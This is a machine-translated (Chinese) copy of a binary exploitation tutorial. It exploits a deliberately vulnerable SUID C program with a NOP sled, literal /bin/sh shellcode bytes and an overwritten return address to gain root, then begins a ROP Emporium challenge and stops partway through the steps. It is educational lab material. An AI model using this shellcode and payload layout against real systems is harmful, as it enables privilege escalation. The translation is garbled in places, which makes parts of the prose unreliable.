<html>
<head>
<title>Into the art of Binary Exploitation 0x000002 [Sorcery of ROP]</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">进入二进制开发的艺术0x 000002[ROP的魔法]</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/into-the-art-of-binary-exploitation-0x000002-sorcery-of-rop-b4658238ee62?source=collection_archive---------0-----------------------#2021-10-02">https://infosecwriteups.com/into-the-art-of-binary-exploitation-0x000002-sorcery-of-rop-b4658238ee62?source=collection_archive---------0-----------------------#2021-10-02</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><figure class="gl gn jo jp jq jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi jn"><img src="../Images/89fcff5611a03064cb26193735d9dd0a.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*pqTELgXfCM-2Yf8hc4pXSg.jpeg"/></div></div><figcaption class="jy jz gj gh gi ka kb bd b be z dk translated">黑客经常把他们的工作描述为精力充沛、富有想象力的解决问题。</figcaption></figure><p id="034c" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">嘿黑客们，✋✋</p><p id="edfb" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">我带着“二进制开发”系列中的下一篇文章回来了。我已经为未使用过的人打开了进入这种开发技术的入口。因此，我在过去的文章中体面地确保了简单的步骤，使这个主题变得平常&amp;这将是继续。因此，如果你没有得到滥用技巧的智慧，在你得到<a class="ae la" href="https://7h3h4ckv157.medium.com/into-the-art-of-binary-exploitation-0x000001-stack-based-overflow-50fe48d58f10" rel="noopener">第一部分(0x000001 </a>)后仔细检查这个。</p><h1 id="d822" class="lb lc iq bd ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly bi translated"><strong class="ak">越陷越深</strong></h1><p id="a336" class="pw-post-body-paragraph kc kd iq ke b kf lz kh ki kj ma kl km kn mb kp kq kr mc kt ku kv md kx ky kz ij bi translated">一些我们在过去的文章中忽略的东西是“根”。毫无疑问！我在举例说明超级用户。在Linux中，没有root我们什么都做不了。<strong class="ke ir"> SUID </strong>二进制滥用通过设置SUID位来固化二进制。代表“<strong class="ke ir">集合所有者用户Id </strong>”。通常是应用于脚本或应用程序的例外授权。如果设置了SUID位，那么在运行该命令时，它的实际UID将成为记录所有者的UID，而不是运行它的用户的UID。因此，程序执行的任何操作都将与该用户一起执行。</p><p id="dbba" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated"><strong class="ke ir">如果我们在超级用户下面误用了一个二进制文件，会发生什么？？</strong></p><figure class="mf mg mh mi gt jr gh gi paragraph-image"><div class="gh gi me"><img src="../Images/79efebe76ba14fb011023a4a684e7ef7.png" data-original-src="https://miro.medium.com/v2/resize:fit:1280/format:webp/1*tGzD-5nXxuENK14mg3vKvw.jpeg"/></div><figcaption class="jy jz gj gh gi ka kb bd b be z dk translated">我们开始吧</figcaption></figure><p id="c3a1" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">作为一个例子，我现在制作了一个可执行的二进制文件，它可以通过命令</p><blockquote class="mj mk ml"><p id="b4b5" class="kc kd mm ke b kf kg kh ki kj kk kl km mn ko kp kq mo ks kt ku mp kw kx ky kz ij bi translated">find/-perm-u = s-type F2 &gt;/dev/null</p></blockquote><figure class="mf mg mh mi gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi mq"><img src="../Images/050fde4b2a9eca032748e9aa103068ce.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Hthq5hVltZ1scux5r7gunQ.png"/></div></div><figcaption class="jy jz gj gh gi ka kb bd b be z dk translated">可执行二进制(32位)</figcaption></figure><p id="2cc3" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">源代码粘贴在下面。显然，这是那个可执行二进制文件“vuln”的源代码。如果你不介意，毫无疑问，这是我自己作为一个案例公平地做出的。你们中的一些人现在会明白，但这对澄清新人是公平的。</p><pre class="mf mg mh mi gt mr ms mt mu aw mv bi"><span id="20ed" class="mw lc iq ms b gy mx my l mz na">/** Written in C **/<br/></span><span id="dce1" class="mw lc iq ms b gy nb my l mz na">#include&lt;string.h&gt; <br/>#include&lt;stdio.h&gt;   <br/>#include&lt;stdlib.h&gt;   <br/> <br/> <br/>void abracadabra(char *fun) {   <br/>    char data[400];   <br/>    strcpy(data,fun); <br/>    printf("copied..!!");    <br/>}   <br/> <br/> <br/>int main(int argc, char* argv[]) {   <br/>    if (argc != 2) {    <br/>        printf("No input provided..!");   <br/>        return 1;   <br/>    }   <br/>    abracadabra(argv[1]);    <br/>    return 0;   <br/>}</span><span id="8970" class="mw lc iq ms b gy nb my l mz na">/** end **/</span></pre><p id="349f" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">如果我们没有提供任何输入，这段代码将被执行。</p><blockquote class="mj mk ml"><p id="ee4d" class="kc kd mm ke b kf kg kh ki kj kk kl km mn ko kp kq mo ks kt ku mp kw kx ky kz ij bi translated">如果(argc！= 2) { <br/> printf("未提供输入..!");<br/>返回1；<br/> }</p></blockquote><figure class="mf mg mh mi gt jr gh gi paragraph-image"><div class="gh gi nc"><img src="../Images/fd3fdac5cb5659ed26f8b8b544069943.png" data-original-src="https://miro.medium.com/v2/resize:fit:1044/format:webp/1*VNHdP_u8e_Af-6ze_ePcXQ.png"/></div><figcaption class="jy jz gj gh gi ka kb bd b be z dk translated">未提供输入..！</figcaption></figure><p id="ab6d" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">argv[1]是指向所提供的主要命令行参数的指针。提供的输入被传递给函数abracadabra，并被复制到一个400的测量缓冲区中。</p><blockquote class="mj mk ml"><p id="adf1" class="kc kd mm ke b kf kg kh ki kj kk kl km mn ko kp kq mo ks kt ku mp kw kx ky kz ij bi translated">1)abracadabra(argv[1])；</p><p id="2e09" class="kc kd mm ke b kf kg kh ki kj kk kl km mn ko kp kq mo ks kt ku mp kw kx ky kz ij bi translated">2)void abracadabra(char * fun){ char data[400]；strcpy(数据，好玩)；printf("复制..！!");<br/> }</p></blockquote><figure class="mf mg mh mi gt jr gh gi paragraph-image"><div class="gh gi nd"><img src="../Images/94ac0def066594fb61ec476643f038fe.png" data-original-src="https://miro.medium.com/v2/resize:fit:1356/format:webp/1*6IiHXtsXXeCeJO663X-IOQ.png"/></div><figcaption class="jy jz gj gh gi ka kb bd b be z dk translated">复制</figcaption></figure><p id="37e1" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">通常，这足以详细说明它是如何工作的。但是您注意到这段简单代码中的漏洞了吗？？如果你了解我过去的报道，你就会知道我在做什么。它非常简单&amp;协调。与真实世界的插图相比，这种情况被强烈地重新安排。大多数工作框架和编译器都有一些默认的亮点来预测缓冲区溢出。标准计算机上的严重安全问题通常是一个美丽可怕的想法。因此，我将做这个演示，以公平对待这篇文章本身。</p><figure class="mf mg mh mi gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi ne"><img src="../Images/10a0e817ce2b936b3b688c3239613ac9.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*NUWcoRLKder5QAw1uBERIg.png"/></div></div><figcaption class="jy jz gj gh gi ka kb bd b be z dk translated">分段故障</figcaption></figure><p id="5f5b" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated"><strong class="ke ir"> strcpy </strong>内置函数不检查缓冲区长度，可能会非常好地覆盖与预期目的地相邻的存储区。如果该程序作为set-root-uid程序运行，普通用户可以利用此缓冲区溢出漏洞并接管root权限。整个函数家族:strcpy、strcat和strcmp同样容易受到攻击。让我们从汇编级别深入研究一下代码。我利用python脚本fair来分析实际的内存崩溃区。</p><figure class="mf mg mh mi gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi nf"><img src="../Images/bc668c718ea96d4f5b34bddabc61fab5.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Elwmx1IzdHlnx-hU3fPaIw.png"/></div></div><figcaption class="jy jz gj gh gi ka kb bd b be z dk translated"><strong class="bd ld"> python exploit.py &gt; exp </strong></figcaption></figure><p id="8ed2" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated"><strong class="ke ir"> exp </strong>可以通过广发，分析EIP。请记住，EIP是32位进程的指令指针或程序计数器，而RIP是64位进程的指令指针或程序计数器。在过去的文章中，我指定了64位(RIP)。</p><figure class="mf mg mh mi gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi mq"><img src="../Images/c6218e78fd33cf0bd612f7e8c462f058.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*7-rBANc5UQgBBMfyZmXlOA.png"/></div></div><figcaption class="jy jz gj gh gi ka kb bd b be z dk translated">0x65616164 = d a a e(小端)</figcaption></figure><p id="67c5" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">目前这项工作很简单。现在，我们可以通过稍微修改脚本来计算估计值。</p><figure class="mf mg mh mi gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi ng"><img src="../Images/fdc1a305ac328c38cc8abc8c4b885f38.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*7C9krkILyGbUsHy2-rJ-ag.png"/></div></div><figcaption class="jy jz gj gh gi ka kb bd b be z dk">412</figcaption></figure><p id="015d" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">412是eip之前容量还是基本公平的一个虚拟边界？以下位将溢出到eip中。即412 + 4 ('d' 'a' 'a' 'e') = 416。</p><p id="757f" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">我过去常常从网上找到一个合适的外壳代码estimate 53。</p><pre class="mf mg mh mi gt mr ms mt mu aw mv bi"><span id="ee6d" class="mw lc iq ms b gy mx my l mz na">"\x31\xc0\x31\xdb\xb0\x17\xcd\x80\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"</span></pre><figure class="mf mg mh mi gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi nh"><img src="../Images/a9ccd67dc9c51ddc2333d104852b5fc4.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*1qfW4sk6UJtG5XFWev6UYw.png"/></div></div><figcaption class="jy jz gj gh gi ka kb bd b be z dk translated">容量(412)-外壳代码(53)</figcaption></figure><p id="7b8a" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">我们将把359张NOP载玻片放入堆栈。在计算机安全学中，NOP滑动可以是NOP(无操作)指令的排列，暗示着将CPU的指令执行流“滑动”到它的最后&amp;渴望的目标。我们将NOP幻灯片放在外壳代码之前来填充缓冲区。</p><figure class="mf mg mh mi gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi ni"><img src="../Images/e2991a97b6a0ab7233097176d0b77379.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*fxdHzDUzadp50B0oFQzo5A.png"/></div></div><figcaption class="jy jz gj gh gi ka kb bd b be z dk translated">图形视图</figcaption></figure><p id="6cb7" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">NOP幻灯片(359) +外壳代码(53) + eip (0xffffcd90)</p><blockquote class="nj"><p id="ed42" class="nk nl iq bd nm nn no np nq nr ns kz dk translated">溢出发生在EIP到我们在堆栈结束时给出的地址的改变中。该地址集中在执行NOP(无操作)的堆栈本身。最后，它会到达外壳代码，这将执行！！</p></blockquote><figure class="nu nv nw nx ny jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi nt"><img src="../Images/512e7aa0f2af16d2955782b31aa77ce2.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*ePRaQc3L3RiLelVzgv9dZw.png"/></div></div><figcaption class="jy jz gj gh gi ka kb bd b be z dk translated">利用代码😈😈😈</figcaption></figure><p id="843e" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated"><strong class="ke ir">在没有任何安全评估的情况下，我们将一键切换到机器的超级用户..！！</strong>😈</p><figure class="mf mg mh mi gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi nz"><img src="../Images/608d0b0e7fb84bf03768e07bb01ec9d5.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*0X75jM1da-TXIqxKthFbAQ.png"/></div></div><figcaption class="jy jz gj gh gi ka kb bd b be z dk translated"><strong class="bd ld">机器受损</strong></figcaption></figure><figure class="mf mg mh mi gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi oa"><img src="../Images/ef1d0cb3eb88364c94cb3b6ee809f162.png" data-original-src="https://miro.medium.com/v2/resize:fit:736/1*kXrV24dEcOejNQpoIMI_1g.gif"/></div></div><figcaption class="jy jz gj gh gi ka kb bd b be z dk translated">是啊…！！我们做到了</figcaption></figure></div><div class="ab cl ob oc hu od" role="separator"><span class="oe bw bk of og oh"/><span class="oe bw bk of og oh"/><span class="oe bw bk of og"/></div><div class="ij ik il im in"><blockquote class="nj"><p id="2944" class="nk nl iq bd nm nn no np nq nr ns kz dk translated">但是这还没有结束…！现在，是时候迎接另一个挑战了</p></blockquote><p id="2ccf" class="pw-post-body-paragraph kc kd iq ke b kf oi kh ki kj oj kl km kn ok kp kq kr ol kt ku kv om kx ky kz ij bi translated">从技术的角度来看，我们将理解来自<strong class="ke ir"> ROP商场</strong>的一个基本挑战。这次是64位。</p><figure class="mf mg mh mi gt jr gh gi paragraph-image"><div class="gh gi on"><img src="../Images/acd2f9ebee2b854773db689890703431.png" data-original-src="https://miro.medium.com/v2/resize:fit:1080/1*XfJZ5YE4loIZkN-xn-wUHw.gif"/></div><figcaption class="jy jz gj gh gi ka kb bd b be z dk translated">挑战名称:<a class="ae la" href="https://ropemporium.com/challenge/split.html" rel="noopener ugc nofollow" target="_blank">分裂</a></figcaption></figure><blockquote class="mj mk ml"><p id="b921" class="kc kd mm ke b kf kg kh ki kj kk kl km mn ko kp kq mo ks kt ku mp kw kx ky kz ij bi translated">为了找到旗子，我们必须转移行刑流程。</p></blockquote><p id="7785" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">下载并运行程序后，很明显它会询问用户输入。在我们提供输入/不提供的情况下，结果确实是相同的，输出显示在下面</p><figure class="mf mg mh mi gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi mq"><img src="../Images/b077b39184ad999ff270cc39b88e9911.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*m-DUxD3evxHnktQCH3waXA.png"/></div></div><figcaption class="jy jz gj gh gi ka kb bd b be z dk translated">输出</figcaption></figure><p id="bec7" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">为了创建执行流程的思维导图，我已经通过gdb运行了这个程序。通过快速浏览指令，我们能够得到程序的预期流程。</p><figure class="mf mg mh mi gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi mq"><img src="../Images/9e8674ea62c5200ad634d2b4101ec946.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*jXyKqRv0wSRyeKjc-G79aQ.png"/></div></div><figcaption class="jy jz gj gh gi ka kb bd b be z dk translated">pwnme函数</figcaption></figure><p id="cee2" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">在分析了二进制文件之后，我发现执行是通过函数“pwnme”进行的。</p><figure class="mf mg mh mi gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi mq"><img src="../Images/dafe0138ace6474898be9c2e96009458.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*HQnB4BxcPxMs_uYmYTiwTg.png"/></div></div><figcaption class="jy jz gj gh gi ka kb bd b be z dk translated">西格夫</figcaption></figure><p id="af3e" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">然后我换了radare2</p><figure class="mf mg mh mi gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi mq"><img src="../Images/0601edb9c10e3e087169ee66411e4c2e.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*sdvT4ku6c5kNDJjjE2weeA.png"/></div></div><figcaption class="jy jz gj gh gi ka kb bd b be z dk translated">pwnme</figcaption></figure><blockquote class="mj mk ml"><p id="05d6" class="kc kd mm ke b kf kg kh ki kj kk kl km mn ko kp kq mo ks kt ku mp kw kx ky kz ij bi translated">注意:-你不应该依赖于一个特定的工具或策略来深究案件。这是我个人的结论，因为接触每一部分会让你在未来面对不同的环境时有所不同。</p></blockquote><p id="2a5e" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">很明显，我接下来的步骤就是跳入pwnme函数。</p><figure class="mf mg mh mi gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi mq"><img src="../Images/4abff9b651c16156261c9a6a1a6f526d.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*UlH8gu97_C9VTwytoaEx-w.png"/></div></div><figcaption class="jy jz gj gh gi ka kb bd b be z dk translated">阅读()</figcaption></figure><p id="469e" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">好了，很明显输入是从这一部分开始的。我们能不能滥用这个…？？</p><figure class="mf mg mh mi gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi oo"><img src="../Images/5b08bd775b825c1fd82f6c59cd905364.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*ndBqfGOcMvlU0eLYfpQMGQ.png"/></div></div><figcaption class="jy jz gj gh gi ka kb bd b be z dk translated">嗯嗯…</figcaption></figure><figure class="mf mg mh mi gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi op"><img src="../Images/26310b237b71bbbe9138a3e7d8a02b3d.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*zdsEy1YE--lfZ38VqhW_1A.png"/></div></div><figcaption class="jy jz gj gh gi ka kb bd b be z dk translated">分段故障</figcaption></figure><h1 id="26c2" class="lb lc iq bd ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly bi translated">就像我们已经做的，我们能在栈上注入外壳代码吗？？</h1><blockquote class="mj mk ml"><p id="6c64" class="kc kd mm ke b kf kg kh ki kj kk kl km mn ko kp kq mo ks kt ku mp kw kx ky kz ij bi translated">简短回答:没有</p><p id="00ad" class="kc kd mm ke b kf kg kh ki kj kk kl km mn ko kp kq mo ks kt ku mp kw kx ky kz ij bi translated">但是为什么呢？</p><p id="7586" class="kc kd mm ke b kf kg kh ki kj kk kl km mn ko kp kq mo ks kt ku mp kw kx ky kz ij bi translated">在基于堆栈的缓冲区溢出利用的情况下，攻击者通常控制堆栈的一部分。在获得对程序计数器的控制权后，攻击者继续在堆栈上执行攻击者控制的信息(外壳代码)会非常有帮助，这是可以想象的，如果<strong class="ke ir">堆栈是可执行的</strong>。</p></blockquote><h1 id="1f68" class="lb lc iq bd ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly bi translated"><strong class="ak">如果我告诉你“没有人”使用可执行堆栈会怎么样？？</strong></h1><h1 id="298d" class="lb lc iq bd ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly bi translated">不可执行堆栈[NX]</h1><p id="5f86" class="pw-post-body-paragraph kc kd iq ke b kf lz kh ki kj ma kl km kn mb kp kq kr mc kt ku kv md kx ky kz ij bi translated">NX是一种虚拟内存保护机制，通过限制特定内存和实现NX位来阻止外壳代码注入在堆栈上执行。以前被利用的二进制文件不太安全。</p><figure class="mf mg mh mi gt jr gh gi paragraph-image"><div class="gh gi oq"><img src="../Images/27bc1d0fde9d1dfe0a87d934a32b1154.png" data-original-src="https://miro.medium.com/v2/resize:fit:604/format:webp/1*GHj2ZGct5uYh1t_0txEhVA.png"/></div><figcaption class="jy jz gj gh gi ka kb bd b be z dk translated">NX已启用</figcaption></figure><blockquote class="mj mk ml"><p id="3c07" class="kc kd mm ke b kf kg kh ki kj kk kl km mn ko kp kq mo ks kt ku mp kw kx ky kz ij bi translated">NX赋能！</p></blockquote><p id="1248" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">带有NX位支持的操作系统可能会将内存的某些区域标记为<strong class="ke ir">不可执行</strong>。然后，处理器将拒绝执行驻留在这些内存区域中的任何代码。将内存区域标记为不可执行意味着代码不能从该内存区域运行，这使得利用缓冲区溢出更加困难。当NX位打开时，我们处理基于堆栈的缓冲区溢出的经典方法将会被滥用。这足够残酷到我们什么都做不了吗..？剥削的行动结束了吗..？？？</p><blockquote class="nj"><p id="c1bd" class="nk nl iq bd nm nn no np nq nr ns kz dk translated"><strong class="ak"> <em class="or">黑客永不退出！！</em>T9】</strong></p></blockquote><figure class="nu nv nw nx ny jr gh gi paragraph-image"><div class="gh gi os"><img src="../Images/bc8637236056c240f51aad5fa61edd06.png" data-original-src="https://miro.medium.com/v2/resize:fit:1000/1*SNJ0EkMIgDH-PkERoVzm6g.gif"/></div></figure><blockquote class="nj"><p id="6d92" class="nk nl iq bd nm nn ot ou ov ow ox kz dk translated">现在…我要教你一些魔法。是的……我们要变些魔术。</p></blockquote><h1 id="eadc" class="lb lc iq bd ld le lf lg lh li lj lk ll lm oy lo lp lq oz ls lt lu pa lw lx ly bi translated">面向返回的编程(ROP)</h1><p id="8680" class="pw-post-body-paragraph kc kd iq ke b kf lz kh ki kj ma kl km kn mb kp kq kr mc kt ku kv md kx ky kz ij bi translated">面向返回的编程(ROP)是一种安全误用策略，攻击者利用它在目标系统上执行代码。通过获得对调用堆栈的控制，攻击者可以控制计算机上运行的现有可信计算机程序流，并将其控制到底。它的思想是用堆栈控制将汇编的小片段链接在一起，使程序做更复杂的事情。ROP将程序中已经存在的以ret指令结尾的代码片段(小工具)缝合在一起。这些小玩意通过mov，pop等来获取他们的论点。因此，在攻击者能够在主ROP小工具的地址内重写最初存储在堆栈上的返回地址的情况下，攻击者能够链接许多这样的小工具以执行他们需要的任何代码来获得对系统的控制。在某种程度上，在ROP中，堆栈指针充当指令指针，每个小工具末尾的ret指令导致跳转到另一个ROP小工具，这类似于普通程序。</p><blockquote class="mj mk ml"><p id="21c8" class="kc kd mm ke b kf kg kh ki kj kk kl km mn ko kp kq mo ks kt ku mp kw kx ky kz ij bi translated">那么，我们如何利用这一策略呢？很简单…先列举，后利用。我不喜欢鼓励我的读者。在某些情况下，你也需要努力去得到我想要的。</p></blockquote><p id="2605" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">通过使用对象哑函数“objdump ”,我能够检查几个字符串&amp;通过仔细阅读“flag.txt”记录，它有助于理解排列本身。在雷达2的帮助下，我能够发现它清晰的视野。</p><figure class="mf mg mh mi gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi pb"><img src="../Images/bf520c7c3bad142f9c707909fc9e5d72.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*nLeVm4nNG3EM_7kAFB1euA.jpeg"/></div></div><figcaption class="jy jz gj gh gi ka kb bd b be z dk translated">0x00601060</figcaption></figure><p id="2f4f" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">之前，我主要检查了每条指令，确认程序没有调用任何与这个“flag.txt”相关的东西。它也不在任何函数中。那么，我们如何阐明这一挑战呢？？</p><p id="5e6f" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">更努力地列举…</p><p id="9b64" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">通过分析可用的功能，我发现了一个奇怪的问题。一个名为“有用函数”的函数有系统调用。它确认客户端参数。</p><figure class="mf mg mh mi gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi pc"><img src="../Images/a5b180bfc2c85358e3fe9a7d5c59b22f.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*9iPzNtml--SD88sudeg8oQ.png"/></div></div><figcaption class="jy jz gj gh gi ka kb bd b be z dk translated">有用功能</figcaption></figure><h1 id="b9f2" class="lb lc iq bd ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly bi translated">解决办法</h1><blockquote class="mj mk ml"><p id="59d9" class="kc kd mm ke b kf kg kh ki kj kk kl km mn ko kp kq mo ks kt ku mp kw kx ky kz ij bi translated">如果我们能够提供一个参数，告诉系统函数执行“cat /bin/flag.txt ”,那么在这一点上，挑战就被阐明了。我们已经找到了指向“cat /bin/flag.txt”的地址。这足够了吗？不…我们应该执行它。所以我们应当提供内部系统功能。函数的参数以相反的顺序(从右到左)推入堆栈。此时，该函数将其参数弹出堆栈并开始工作。</p><p id="a76f" class="kc kd mm ke b kf kg kh ki kj kk kl km mn ko kp kq mo ks kt ku mp kw kx ky kz ij bi translated">64位版本的寄存器命名为:</p><p id="2d73" class="kc kd mm ke b kf kg kh ki kj kk kl km mn ko kp kq mo ks kt ku mp kw kx ky kz ij bi translated">rax —寄存器a扩展<br/> rbx —寄存器b扩展<br/> rcx —寄存器c扩展<br/> rdx —寄存器d扩展<br/> rbp —寄存器基址指针<br/> rsp —寄存器堆栈指针<br/> rsi —寄存器源索引<br/> rdi —寄存器目标索引</p><p id="ae8f" class="kc kd mm ke b kf kg kh ki kj kk kl km mn ko kp kq mo ks kt ku mp kw kx ky kz ij bi translated">x64中函数的参数在寄存器RDI、RSI、RDX、R10、R8和R9中传递，第一个参数在RDI中。我们正在研究x64二进制文件，我们可以看到我们应该将我们的<strong class="ke ir">单个参数传递给RDI寄存器</strong>中的system()。</p></blockquote><p id="9cb8" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">我们将通过将地址放入堆栈，然后调用pop rdi来实现这一点。这将是我们第一次使用<strong class="ke ir"> ROP小工具！</strong></p><figure class="mf mg mh mi gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi mq"><img src="../Images/fed42eb2defde2195f871152e2414fc2.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*bq-nLhsYd1k6JvL4MbcOrQ.png"/></div></div><figcaption class="jy jz gj gh gi ka kb bd b be z dk translated">找到小工具</figcaption></figure><h1 id="3c74" class="lb lc iq bd ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly bi translated">剥削</h1><p id="c8a1" class="pw-post-body-paragraph kc kd iq ke b kf lz kh ki kj ma kl km kn mb kp kq kr mc kt ku kv md kx ky kz ij bi translated">现在是时候创建一个漏洞了，它将标志返回给我们。这很简单，因为我们已经找到了我们需要的一切。我恭敬地建议您使用python2来构建您的漏洞。这就是我觉得舒服和简单的地方。</p><blockquote class="mj mk ml"><p id="975c" class="kc kd mm ke b kf kg kh ki kj kk kl km mn ko kp kq mo ks kt ku mp kw kx ky kz ij bi translated">1.填充缓冲区</p><p id="48a0" class="kc kd mm ke b kf kg kh ki kj kk kl km mn ko kp kq mo ks kt ku mp kw kx ky kz ij bi translated">2.POP rdi</p><p id="9955" class="kc kd mm ke b kf kg kh ki kj kk 